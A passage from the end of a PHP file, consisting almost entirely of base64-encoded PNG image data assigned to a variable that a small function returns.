eFZkwWPIni2151xc4synyJFLUVkuRfZczFoiyabsKtWOTSZT1K/MyqS4bFRvpr52V0BDLq8CMm3y64YhB8BYmQNQXs3k0LY8hk3uRN1mvvNjbUkWhk3uSPOuWSx9YxtlxY5TZ2RNOx3JVeYq9spNBZQ48nG4HCSRhVnp6vcbEiYV3StzWkYyd95/Jb0Gdgg4Lu9EIbOf+ZR1P2yP0MxiF8OYdXB8XxHvTl3FJTe3pvvgxj6rmSil6HBxAxq0zmDRyxs4sC33tCFrpyO6PNFcueA2kapqE64CqdFsyB16NWfCI6MqtEk9FxFh3fc7eP3ZT8g7GR/FA8KNYcw6cZa5WfbmNvZtzOGKce1JyfSdN5tZP5mbHu3Ntx9s5/v5W0/lHtudRZQ4CigpK8CiJWNR/vNuq4JodIB52qQOZPhtF53VJvVMHHYnH05fxpIPfkIznFy6MYw5BESEHauOc2RnAUMmdvDbFN1sMTHwlnY06ZTJB89/Q8HREkqdxZQ57Fi11IjEVasoOzPXbVSLSVOupVUnX21ST3Ng1zFmPBl/VUAiQfTuxaKYotwy5j23juVztwcsst+yaz0mPzec5l2ycTicmCKc6RQtxtzzknY8PmtiQEMWEb6av5qnJs02DLmSGCtzJdHcwqoFezmwJZdhd3ci2081k7wThRzZfxKJcBGTaAgaEQTMTg7sPsbuzYfp2Ke5z3HlVUBWL98S2QnGGcbKfJ4c2VnA24+tZP2yg2fEbIsmfPHBCp6aNIuDu2uenOKSMhymAqw2G45CmDttOZ+9vvac+OmNK3cxZex0w5CrAGNlrgIcpS4+n7mZvRtyGHRnOxxOB7Of+YS139VEOUUo0fIQk4tUay2SLKkkWDwOv1UL9nB4axFX/6YH6bUTmD/raxa9833ACDoD/RjGXFUIbP3hKId35LPn8FYOHjxY3TOKOG5xUug+hsViIS0hixRbBonWVGzmJCxmGyaThWN7iph1/1cUmQ+xd3t8t42NNIYxVzEFx+3UMjfFlWniWP6BaqvDFenzsl0rpFg7SZI1lRRbJsm2dBKtnlXZak7AYrJiUmbyi09yJHcPbq1mpyuGA8OYw4BSiroZTUhJzODAiR04XPbqnlLYEDQKXcdwKwepCbVItqaTbE07Zcg2cyIWkxVEcSh3N/nFsdmULRYwjDmMpCSk07pBVw7l7CIvDr/ETrFT6D6G1Wwl3VabJGsaSdZUEi2pJFiSsJoSMJtslDlLOZyzJ64fatGAYcxhxmyy0KR2W1ITMzmcuztutpclWh4OCkm2pZFkTSPZmkaCJYUESzIJliQsJhsmZSa36CgnCg7HbdnfaMIw5ghRK7UuyQlpHDi5g5KywuqeTqXRxE2xdgJlVqRbPatxgiWZREsKNq8RW002NNE4eHInxTH8u8YahjFHkARrEi3rdeJo3n5OFJ5PLbHqwSmllEoeCbYkkq0eB1eiJQWbOdHjsTbZMJssFNkLOJq7D7cWbe1+4hvDmCOMUibq12pGapLHOeZ0x0IDM6FU8tFMTtKstUiypnnPxeWeahtWs6dFzrH8g+QV1bwgmWjAMOZqIjUxk9YNunEwZycFJTnVPR2/uMWJnTysFhtpFbbVNksSNnMiZpMVs7LgcJVxOGcPZc5YaZEbfxjGXI1YzFaa1WnPycIjHMndiybR5RxzSDEuk51kazpJ1lSSrGnYzEnYzElYzTavk8tEbtFxjucfRBMjkqs6MYw5CshOq09KQjr7T273NISrZgQNOwWYLSbSrVkkWtNItCRjsyRjMydgNlmxmGxomsaBnF0UleZV95QNMIw5aki0JdOqfmeO5O4jp/BIheY1kcWNA4cqIsGaRJI1nSRLKjZLEgnmJKzeABCTyUKJvYBDOXtwxcSZv2ZgGHMUYVJmGma1IDUxg4M5O3G5nRG8u1BGMZhdpFgzPdtqryFbzYlYTTbMJisKxfG8A+QUHq22B46Bb2LOmLMapVC3eRrH9sSvfpmenEVSQioHT+6gMAJbWA03ZRRgtdpItmaTaEkl0ZLsyXbyxlWblQWn28HBk7ui4igQTmrVSaNN1ybVPY2Qibl85ow6SdwytQ89hjXxWVgvXrCabTSr24H6tZqjVPg+Jhd2nKZCkhPSSE/I9sRXe5MkPB5rj/RUUJLD7iMb496Qu1/clqlBqqJEKzG3MoOn79Nlo9t6+j7N2ExxXuSaokcShaJOekNSE9PZf2J7Fcs+gstkx2SGZGsWiZYUEiwppzzVnrhqqyeSK8rls6ogIdHKjZMHcfl1vaO6smkgon3WdwI+95lKKVr2qM3tf+lLi27Z1V4iJ5wk2VJpVb8rtVLrVsn1lAlMNiE5MYW0xGxSbbVItmac3l6bPdvrUkcxu49uintDbtKqHg+9PJYrbuirx5CjVn+L6pVZKfW+iPwAvAUM8DUmtVYCo/7UnZ8/28+37+/A5Yjav/V5YTaZaZzdmrTETA7m7AoaKmmx+OoeqaiVkU1GWj6ChsVkOxW95flvK2aTBaXMHM8/yMnC+E6QUEpx2bW9uOmeK0hMCtrfS4AXgJnhn1nliInlTERMwG+AvwF+2z8c2VXA4pc3cvJgfJ/rHC47B07uoNhe4PP15u0aMGnKtTRoVhtOeZw9H3VJvoNPXl7DphV70MTtieAyWTApM2ZlweV2cihnFyVl8V14Pi0zmTv/7yp6DminZ1d3DBinlFoQgalVmpgw5nJE5EJgLtDC3xiH3c3yt7axflnsJTKEgohwvODAGdVMlEkx7OYLuH5i4AblIsLPn+1j6VubcDqcmJQZpUwUlJzkSO7euEnT9EenPi0Z/9DVZNXV1TZ3ITBWKXUszNM6b2LKmAFEJA14DpgYaNzWH4+ydPYWSgsjqdVGnuKyAg6c2EFyhoXxD4+kS79Wut97fG8hn/7nF47uy+NI7t64LKBQEavNwqhxAxl264UBO2p4sQNTgb8ppWLi7BbtDrBzUEoVAi8CuwONa9uvLq0GJlNkz4/MxKqJlIR02jTsxm13j6JLX/2GDFCnWRr9bmrE3pOb496QE6xJDLvm8qCtcbxsBvoppZ6NFUOGGFuZRcQK/AHkCSjvSH7ur1BaXMacvy/kh883AFAnvTF1MxrHscdbUErRcUADLhvdjoTk4H5Nt8vNwrnfM3/21+fUso43aqXWpUGtFphNZpp2ymLY3Z1Iyw7U60v2gRqvlFoSsUlWATHz7RaR7iCzge6+R3h+lR0bDjDjyXkcPXCmnJKSkE7j2q2xWRLDPNPII6d6QQvZjVIZfndnGrT2fx48cTiP157+hM2rA25uYh6zyULDrBZkptQ549+T0mwMHt+eNn3PlvrkrP8jM8D0J+9uMOqJemMWkUTQpoL6E+DXq6NpwsK53/PxzK/8FlX39+HGNp4IaRENTdyICFabmUtuakfvEc0xmU9/xCLCqq828+ZzCynMK6m+KUeAoA9vBd0GNWbgbW2wJpjBf5z5Hu8q/WV4Zlp1RLUxe7zXMgtoH2hczrECZjw5n81r9ui6bsVtVywjCCKCiBu3uNHE7ekJLR6nX9seTbj6np6kZSVSVurg7X9/ztef/ozEcZtUpRR10htRN6OJrmNVdqMURvy6E3WbpQUaVr5K/1EpFbWaXVQas4gkgTYl2GoMsHr5Zl7/a+grTYI1icbZrUlOCPghRileI0bQxI1bc3l+xInT7cCleX4EoU7tOgy4vhML31se9z2vbJYEGme3ISXRfxN3X1hsZi65uSU9hjYliP3v9q7Sy85nnuEi6oxZRC4GeQ1oG2hcmd3Juy98wVfzV1NZOVkpE/UymlA7vWEMOcc8hqyhIaLh0pynGro73XbKXHac7lKcmsOTa6yZEZeKa80dICOlNo2yWmI2VT6osWWP2gyZ0J6UzEDOsVOr9B+UUlEVnRQ132ARSQbtMVB/Johktm/7EV59fF6VrTSpiZk0zm6F1RLwQ6xmys/GgoiGW1y4NafXiMsoc5dQ5irB7iqmzFWM0+3AqqVgJmiYYkxjMplpUKs5Wan1quR6KZkJDLu7A827ZgcbugvUOKXU8iq5cRUQFcYsIkNApgPNAo7ThC8+XMGHr3yJo6xqy7hazFYaZbUkPTnoh1gteM7H2qltdflq7HDbvUZcRKmziFJnAZobkk1ZmAKfUGKeJFsqTWq3JsGaXKXXVSZFz2FNuPhXrbBYA64rUbVKV6sxi0gGaH8FNSHYXApyinnt6U9Y930426QqstLq0aBWM0wqGgzBW8tDBO2UITtxag7vlrqUMncxpc4iShwFlDqLsJFCkimdKHlOhwWFonZ6A+pmNsUUxlzvei3SGXFvJ7IaBn1Y7PSu0l+HbTI6qLZPXESGg7wKBC3psOGnncx46n/k50TGkZhoTaZJ7TYk2lIicj/fnCk5uTU3bs1xypDtrmLszmJKXUWUOPJxuspIMWVjUfGno1fEarbRKLs1aUmZEbmfLdHMZWPa0nlgw2DWooHMBNPvlVLVovtF3JhFJBO0Z0EFjK0GcDpcfPTqMj57/6eIyykmb7H6rLT6qIj+mXysxuLC5XbgcNtxuEspc5VQ6iyk1FlIibMAk2YlxZyNir3o3JBIT8qiUXYrLGa/iXNho12/elwxvh2JqUHvvQnUWKXUikjMqyIRNWYRuQrkFaBRsLGH957g1cfnsWdr9TbkTk+q5f0CRcKRVFFy0nBrTtyaC6dW7qn2OLhKnUWUOAuwO4tJUpkkmmJRXtNP9T1YzySjThLDJnekcfuguwIXyN/BNEUpFbEyOBH5y4hILdCe0bMai8DXn/7MO//+HHtJdJRx9WztWpGWVCss1xcEhcdT7Ra311t9WjM+vRoXeVZjRwFut5s0c13MKvKrVCRJtCXTOLsNSdV65DmNyazoN7IFF1x7ZnSdHzZ6V+mVkZhb2I1ZRG4EeREIGkNZXFDKG39byMplm6NOF1VKkZ3WgHpV6nSpsKVG80ZvudA096nV2OG2nzLiUmcBJc5CbKSSYs6q1lUq/Ciy0+pRP7MZpiiM1GvcvhbDJncgo05SsKERW6XD9m0QkXpeI75ez/ht6/Yx/Yl5nDgS3SmLHjmkDQnWoB9iAOTU/4p4orjKPdUeyamCk8tVRImzkFJHIQ53GWmmOthMVSvFRBvRLhOWk5Bs4Yrx7Wh/YX09wzeAulMptTpc8wmLMXtX45eBoJ+G2+Xmkze+45M3vsHtjo3U0coHKpw24rMdXG7NdTqKyxsAUuIsOOXoMmk20i31okQyCx+piRk0rt3a21UyNug8sCGX3dEWW2LQz6Z8lX5MKVXlZ8gqNWYRaQDyEjBKz/jjh3KZ8eT/2PbLvqqcRsTISM6mUXZLzCa959aKcpPHkF2a41QkV5mrpIKTq9Dr5Coh1ZxNsjk85/VoITZDa0+T1TCF4ZM7UL+VrlJE672r9JqqnEOV/dW8q/ErQJaOsaxYupE3n1tEcaG9qqZQLdgsiTTObh00uL+8lcsZurE4Pedilx27u4QyZ9FpJ5ezAE0TMq2NsKrYWaUqQ2wnvZzGbDHR/6aW9B7RVE+Dhipfpc/bmEWkmSekjcF6xttLHLz1z8V8t2hdpRMkog1P2p3/aiblxQM0BE1zeXRjbzhmmasEu7PIG/xRcMrJlWTKIMPaIM6dXOXpqM3PK0Ei2mjWJYthd3cktZauh/Av3lX65/O9b6W/KSKigAkgzwG6Hqm7txzi1cfncWTfycreNqrxlxDv0Y61M9IUPTHVxafOxMWOfEqc+ThcDmpZG5FkDi2NL9aIz0IRp0lOtzFkYgda9aytZ7gT5B9gelQpVekKlJUyZhFp4Qld43I94zVN47N3f+Sj6ctxOas2QSKaUEpx6dW9qZ3SmC0/HPWE4VdIkHBVOBufOhc78il25FHsyMeMjSxbk7jXjtt0aUK//n1Y/9lRtDgvlNB9cGMG3Noai02XnLnOu0qvrdT9QhlcYTX+O5Cq5z15JwqZ8dT/2LhyV2XmFzOkpCUy5s9X0m9QJ0Rg0zeH+fLNLdiLnWgVvNUOd+mpCK6islyKHbmUOApIMdcm3Vo17WeiFbPFxJW39+eaOwdgsZo5sCWXRS9vpOB4bPtNglGnaSoj7u1E7Sa6TMYJMg1MTyqlQqq0qNuYRaSVt2jAQL3vWfvtNmY98ykFudWeHRZW2nZrysRHR1G7wZlhfjmHi1n08gb2bT2Gy+2gzF16ajUucuRRYD+B0+Ug09oIm+l8dOvop3aDTO56eCTte5yZ5WovdrJ01la2/HCkmmYWGSw2M5fe3pqugxrp9db/5I0e26z3HkGvKiIW4F6QvwC6Yuocdifvv7SUpR+viut6U2aLiavvuIRr7rgEk59azC6nxncfbmf5x+soshdQ7MijqCyHQnsOaGbSLHXiOkFCKUWfyzsy+o/DScvwHewiAhu/PsRXb26jrDR+j2EArXvXZchd7UlK13WUsoOaCjynZ5UOaMwi0slbUK+vrpkCB3Ye49Un5rF/x1G9b4lJ6jTMZMIjI2nbran3X4IUj/rlOG//6wt27d1OUVkuZi0Rm4rvSK6klARu/vVgBlzdQ9dqlHu4mIUvbeTITt89tOKFtOxEhk7qQLPOQVXccn70rtJbAg3y+RcWETPwIMijoK/ujAh8+fFK3ntxKQ57fLeE6XdFZ8b8aTgpaWfnDgf+wpYUOJj7z8V8+/mauF6NwdO8buJjo2jYXK+32rODc7s0vnt/F6sX7otv55gJel/ZjP43tsRs0fVdKAX1OAFWaX/G3AjkgN6JFeaVMPvZBaz5OuCDI+ZJSLJx+++HcvGIbgFWGuUgwANQRPj+003MfWEBJcXx5/gxmRSDb+zHDXdfjtWmRzv2bbB71+ew6OWNFOdFR+ZcuKjfKp0rf92JzHp6d2nqJqXUBz5f8fWPItIQ5KCeS29atZsZT80n93hMFP2vNC06NGTSlFHUbxIw3HwVqFuAbsB0AkTDHdmby/QnP2bX5v3ES4mfWnXSGPvA1XS9oLWO0VIGBIyqKC1w8tn0TexcE999sGyJZi6/sy0dL2kYrNQvoH6llHrf5yu+/lFE6oMErArgcrqYN+sbFr71XVxvh0wmxdCbL+D6iZcFapMqIC+A6c/loXki0hSYg58m8QDOMjcfz1jO4ve/Q3PH7t9QKUW3i9pw5/9dSWZtXfFDc4DfgvY7UI8SoBqriLD28wN88+5OnGXx3ROrQ//6DBobrFdY6CtzPRC/WsHRAzm8+vg8dm3StXjHLLXqpDPuwauCtUk9AuoOpdTnZ7/g9T38CXiSAE3iN/64h5lPf0zuidjb3dgSrdww6XKuuKEvpuDxyAXAPUqpueX/ICLDQN4AAorsx/cVsfDFjZzYH7UNJaqEzHrJDJ/ckYZt/SVsqBuVUh/6fMXXP4pIHRCfzaWdDhe/vfoflBZFrBpKtdC9fxvGPXA16VkB1bgloMYopQLuYkTkIuAdoKm/MfknS3jjrwtY8+0mYmXb3bhlXSY8MpJm7RroGf4tcLtSau/ZL4hIXW9TwBGBLuAsc/P13B2sXXogQGuo2MdsMTH66b5kN/L13VPXK6X+6+t9/rY3fv9UmluLa0O22izc/vuh3PfMrwIZsgvkcVBDgxkygFLqe6Ar8JG/MRnZyfx62g2M+f01JCRGd+F6ZVJcfm1vHp0+To8hu4Bngct9GTKAUuoYqKtA/Q7w6/GyJpgZNK4dI3/flaS06P4bnQ9ul4bL/5HCb9K/v815bFQJqGIatajD3VOvpUnrgEUHtoO6VSnTqlCurZTK96SJ8lvgr/jweJvMistv6EHbbk2Z+Zf57NmuW1CIGGmZydzx5yvpNbC9Hu14H57V+JtgA5VSAjwvIt+DvAP4Pdu07l2Hei3TWfzyJvZtzPE3LF7xu9CGvDLHI+UrzZSZ44MZ8geg+iqlQjLkU/dRSpRSzwMXA36bIzduk81Dr9zB8BsGYrFET9JFx94tmDprAr0v7aDHkD8Euusx5Ip4it+pHiBzAo1Ly0rghge7c/GvWmIO3HUi3jBWZn+kZiQz9n7PShOAQlD3KKXeqop7KqVWikgf4A3gSl9jbIlmbvrdQDr2bs4bf1/AiePVJ89YrGZGjR/IiFsv8hu2WoFC4E9KqemVvZ+3ufkYEVnirSPnM0NBmTyVMpt2zGLhSxvJO1pa2VvGEsbK7IuOvVvwxOy7ghnyKlC9qsqQy1FKnQSuBn4H+AyZUwq6XNKMR6bfSe+Luoe1FYs/6jfJ5oH/3MFVoy/WY8irgF7nY8gVUUq9CaoL8EOgcQ3aZHD7X/rS8ZIGMVlyKET8LrQ10pgtVjPXT7qMP/7jVrLq+a3ZJCD/BtVfKRWWBldnbbv3+BuXWTeZydOu4rZ7ryE5KUL1oxX0H96VR2eMp3XnxsFGC/BvoMr/VkqpPaAGeByO/r/ICckWht3dkeGTOwbRaWMev7ZZ47bZ9RpnMWnKKFp2DNhU45gnsN20MBJzUkqtqLDt9inPmK0mBt3SldbdGjJ72gL27PbpGK4SklMTuf0Pw7lwSBcdEUkcAe5USn0WrvkopVzAVBH5FuRNwKcLXSnocHF9GrTJYNFLGzm0PbrLNlcSY2VWSnHRsK5MnXVXMENeAqq7UioihlyOUuoEcBUBtt0AzTrW5oFXb2XwNQPC0nOpdefGTJ01gYuG6jLkeUDncBpyRZRSS0B1BxYFGpdZL4lfPdaLC0a10FNYL9YI+cwcVytzUkoCEx69homPjiQpxW84cEjacTiosO2+AvAbXpeYYuXW/xvIPVNuJquW7jS6gFisZq658xIe+M8Y6jYKWta3BJiklLrWe/aPGF5N+spgmrTJrOh/U0tufKgH6bXjqjNmzV2ZW3dpwuOzJ3DR0K6Bhu0BNUAp81SlVLU/yLx9fgOuQEopeg5qwcOv3kn33p3Py/FTu0Emf/j7rVw34TIs1qDnzY3ABVXl5KoMpx96qj+wI9DYJh1rcfu0vrTpGzclmWreymwym7h6zMU88MLoYCvNB6B6KKUCekwjjXfbfSVBtt3ZjVL5zXOjuHHcMGy20OprK6Xoc1lHpswcT8deLYINL3dy9VJKrQ/pRmHCo/erniABlYakVCtX39eZwePb6+k6Ee2ErDPH9MqcVTedCY+OpEPP5oGGFYK6VykVMDihOqkQFbUOeBs/jh+z1cSIcX1o27MJs6b9j0MHg9fTSkiycetvhzDgqh56zpVH8Ti5Fof4K4QdryY9WkS+CKhJK0XXQY1o1D6TBf/ZwPG9MZuwUXNW5t4DO/D47AnBDHm1VzuOWkOuiFLqKzw50gGNqXX3+jw84w4uGdwHFUCTbt6uAY/NGM/Aa3rqMeQvgB7RaMgVqaBJ/xhoXHajFG57og89hzWJlXyWs4n/oJGERCt3/HkEv552A2mZfqs2lGvHF4VLOw4XSqnjeGSrBwC/UfgpGQmMmzKciQ/cQGrqmbnFZrOJob+6gIdeHkujFkHL+ZR57zWsuhyCoeLVpC8JpkmbrSYuG9OW6/7cjZTMmGv9E5oDzLu9ixmatqnPYzPHc9moXoGGHQd1lVLm+8LRgS8SeB0/zwKDAL8GphRceFV7Hnl1LO06eap+ZGanct+zN3PLb4dgSwjq5NqMx8n1bDQ4BENBKeVSyjwV1FAC/I0AWnSvzehpfWjeLbpbx56FX9v0u9EQ0dz4MPayUgeTrni2iuZ1fiilGHxTP26YdFmwL+hSUKNjZYXRgyfnnDnA0EDjnGVuln30M32HticzW1cR9jnAZKVUzBc79+ZJvw4MDzhOE1Yv3sd37+3C5YyOZ9ftT/WhXktfLYpUf29K7TkECraN6tU5PSuF+569iVt/OziQIZdrx0PiyZDh1Lb7SiDgltKaYGbIrb31GPIJYJRSakw8GDLo16SVSdF7RDNuntrbT0GAqCLkMzNEsROsc79WPPH6BLr3bxto2J5o0o7DgVLKrZSaSpBttw6W4UlXnF8lE4siQtGk67VI47Yn+9DlMt1dJ6qDkINGIApXZovVzM2/voI//v0WMrMDFo6LSu04XHi93d2Bc+qQBcGFZ2W/QikV1wXd9GrS1kQzQya056rfdiIhJSoTNmJ/ZW7YvDaPvjqOYbdcGOipWeipyWW6SSmVF8n5VTeeLSUj8BinnjKWu4EBSqm43bmcjVKqUCnzaFB3AAGF5rb96jHm6X406RA0tDXSxO7KrBQMuKoHU2aOp1m7+oGGxpR2HA4qbLsH48lm8sccoGtN2bmcjV5NOr12Ijc83IOLbmiByRw12+7YXJlT0pO454nrGffgVSQk+W8SEavacbhQSi3DE2TyxVkvFeCpyTVGKRWzIVBVgd48aZNJceF1LfnVoz3JqBMVnTpjb2Vu260pj8+6iz6Xdww0LOa143Dh3XYP57S3+yc8kVxzA76xBqGUcurVpBu2zeT2aX1pf2HA3WEkiJ2V2Wwxc+1dA7n/37ef0+/4LJZWR95xLFFh290bTxWQ+O54X0n05kknpli48tedGHZ3x+pM2IiNlbl2g0zuf+F2Ro4dgNni949VUTs+FMn5xSpKqZ+Vjv6+NRm9mjQKOg1owG1+gzrCTnSvzEop+l3RmSden0Dbrn6bPkAN0I4Nqo9QNOmshincMrUXfa5qFulqJiGnQEKEVuaklARu+91Q+g/vGkyo/wDUxJomORlEHqXUKhHpCdpLoG5utL/OAAAEOUlEQVT3N85sMTHg1tY061KLxa9spig3Ip1eKrUyh92YW3RoyJSZ44P0O6YQ1KSaqB0bVB+haNLNumRz+7S+tOqlt7H8eVGpM3PYzlgmk4kRt13Ewy/fSf2mATNWyrXjaitRY1Cz8WrSvYA1gcalZNgY+YcuDLqzHdaEsDrHKrUyh4XM7FT++I9buOmeQcH6HRvasUFUoJTaBuqCYJq0UoruQxpzy+O9yW4ctoSNSq3MVe5g6nFxO558cxKd+rQMNMzQjg2ijlA06TpNU7n9qb50Hxy0eUBlCLkIfsA3hYot0cpNky9n0HV9gnn+lnpiqw3JySA6UUotEZHuwfKkLTYTg8a2o1mXLD6fuZnSAr81GUOl+lbmxq3q8uirY7nihr6BDNnQjg1iBt2aNJ72s6On9aVZ56qpb061eLMVnobcr44N1iZ1D6iBhnZsEEuEokmnZSVy3f3dueTmVpgt561JV0pnrrRhpWWmMPb+EfQcELC7IhjasUGMo1eTNpkVfa9pTpOOtVj00iZyj5RU9paRiwDr0Ks5T8y+K5ghF4G6w9CODeKBCpr0WIJo0g1aZ3DbU33oeInPEuh6CP8222I1c+Pdl/Pnf91GrboBY1ZXg+rp0e8MDOIHpdTroLoSJE86IdnC8MkdufLeTpVpPxveRIu6jbN48MU7uHJ0f0wmv5c0tGODuEcptVtPnjRA+/71GT2tLw3b+O0R7ovweLOVUvQf3pXHZ91Fq04B26QeB3W1oR0b1ARC0aQz6nrbz16ru5pJ1evMnobcw7hwSNAOhIZ2bFAj0atJm8yK/je2pGmnWix6eROFJ+2BLhu6yiSibRHR5Owfe4ldnpo0S44eOHnOa2f9OETk/0Qk4iGjBgbRhIiYROR+j00EtBkpLSyT+f9cJ4d35vkZI6H3phXRNvu6mKZp4nK6ghnyHhG5KAx/FwODmEVEeoto24MZtGiauF1uf8Zc29/1Qz4zK+XJ4wzAh95yPj5baBgY1FT01u5GEej8HLpkLKJtCPoEOfOnRETuC/lGBgY1EBEZI6IVhmhjIiKhF/IW0X4J4SarRSRgrxgDA4MzEZG2HtsJyZhD0rG8N9LW6bi4JuJ+XkRirsmtgUE0ICJWEfdUEc2t05hDryIoov0c5MLHROTKMPx+BgY1DhG5QkQ7pMOYdfXlPevi2poAF10qIg3D8DsZGNRYRKSuiLYwiDGHXsJERFvl42JOz5bA0I4NDMKBiCgRuU9EK/NjzKH3yBHRVp51IUM7NjCIECLSR3xq0pJYiYtpKypc5AMRCdgrxsDAoGoRkXQR91tnGbPfDooBLqT9aGjHBgbVz5matFgrcQH3fwzt2MAgOhCRdh6ntFRbxzoDA4MqQkQSRCRqur4bGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGJzB/wPeyObVjNaUZwAAAABJRU5ErkJggg==
  ";
  return $img;
}

?>